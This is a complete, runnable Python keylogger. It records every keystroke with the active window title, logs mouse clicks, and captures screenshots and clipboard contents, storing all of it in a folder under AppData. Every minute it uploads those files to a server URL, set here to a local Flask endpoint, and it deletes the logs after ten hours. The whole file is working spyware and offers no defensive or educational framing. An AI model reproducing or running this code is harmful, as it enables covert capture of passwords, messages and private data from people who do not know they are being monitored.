from pynput import keyboard, mouse
from PIL import ImageGrab
import schedule
import time
import threading
import os
import requests
import pyperclip
from datetime import datetime, timedelta

# === CONFIG ===
BASE_DIR = os.path.expanduser("~\\AppData\\Roaming\\Logs")
os.makedirs(BASE_DIR, exist_ok=True)

LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")
SS_FILE = os.path.join(BASE_DIR, "screenshot.png")
CLIP_FILE = os.path.join(BASE_DIR, "clipboard.txt")
START_TIME_FILE = os.path.join(BASE_DIR, "start_time.txt")

SERVER_URL = "http://127.0.0.1:5000/upload"  # your local Flask server

# === INIT START TIME ===
if not os.path.exists(START_TIME_FILE):
    with open(START_TIME_FILE, "w") as f:
        f.write(datetime.now().isoformat())

# === GET ACTIVE WINDOW TITLE ===
def get_active_window_title():
    try:
        return os.popen('powershell (Get-Process | Where-Object {$_.MainWindowHandle -ne 0 -and $_.MainWindowTitle -ne ""} | Sort-Object StartTime -Descending | Select-Object -First 1 -ExpandProperty MainWindowTitle)').read().strip()
    except:
        return "Unknown Window"

# === FORMAT KEY ===
def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    elif key == keyboard.Key.space:
        return '[SPACE]'
    elif key == keyboard.Key.enter:
        return '[ENTER]\n'
    else:
        return f'[{key.name.upper()}]' if hasattr(key, 'name') else str(key)

# === LOG KEYPRESS ===
def on_press(key):
    window = get_active_window_title()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] [{window}] {format_key(key)}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line)

# === MOUSE CLICKS ===
def on_click(x, y, button, pressed):
    if pressed:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        window = get_active_window_title()
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{window}] Mouse Click at ({x}, {y}) - {button}\n")

# === SCREENSHOT ===
def capture_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(SS_FILE)
    except:
        pass

# === CLIPBOARD ===
def capture_clipboard():
    try:
        content = pyperclip.paste()
        with open(CLIP_FILE, "w", encoding="utf-8") as f:
            f.write(content)
    except:
        pass

# === UPLOAD TO SERVER ===
def upload_to_server():
    capture_screenshot()
    capture_clipboard()
    files = {}

    try:
        if os.path.exists(LOG_FILE):
            files['keylog'] = open(LOG_FILE, 'rb')
        if os.path.exists(SS_FILE):
            files['screenshot'] = open(SS_FILE, 'rb')
        if os.path.exists(CLIP_FILE):
            files['clipboard'] = open(CLIP_FILE, 'rb')

        response = requests.post(SERVER_URL, files=files, timeout=10)
        print("Upload result:", response.text)
    except Exception as e:
        print("Upload failed:", e)
    finally:
        for f in files.values():
            f.close()

# === DELETE OLD LOGS ===
def delete_old_logs():
    try:
        with open(START_TIME_FILE, "r") as f:
            started = datetime.fromisoformat(f.read().strip())
        if datetime.now() - started > timedelta(hours=10):
            for file in [LOG_FILE, SS_FILE, CLIP_FILE, START_TIME_FILE]:
                if os.path.exists(file):
                    os.remove(file)
            print("Logs deleted after 10 hours.")
    except:
        pass

# === SCHEDULER THREAD ===
def run_scheduler():
    schedule.every(1).minutes.do(upload_to_server)
    schedule.every(1).minutes.do(capture_screenshot)
    schedule.every(5).minutes.do(capture_clipboard)
    schedule.every(10).minutes.do(delete_old_logs)
    while True:
        schedule.run_pending()
        time.sleep(1)

# === MAIN ===
if __name__ == "__main__":
    threading.Thread(target=run_scheduler, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as k_listener, \
         mouse.Listener(on_click=on_click) as m_listener:
        k_listener.join()
        m_listener.join()
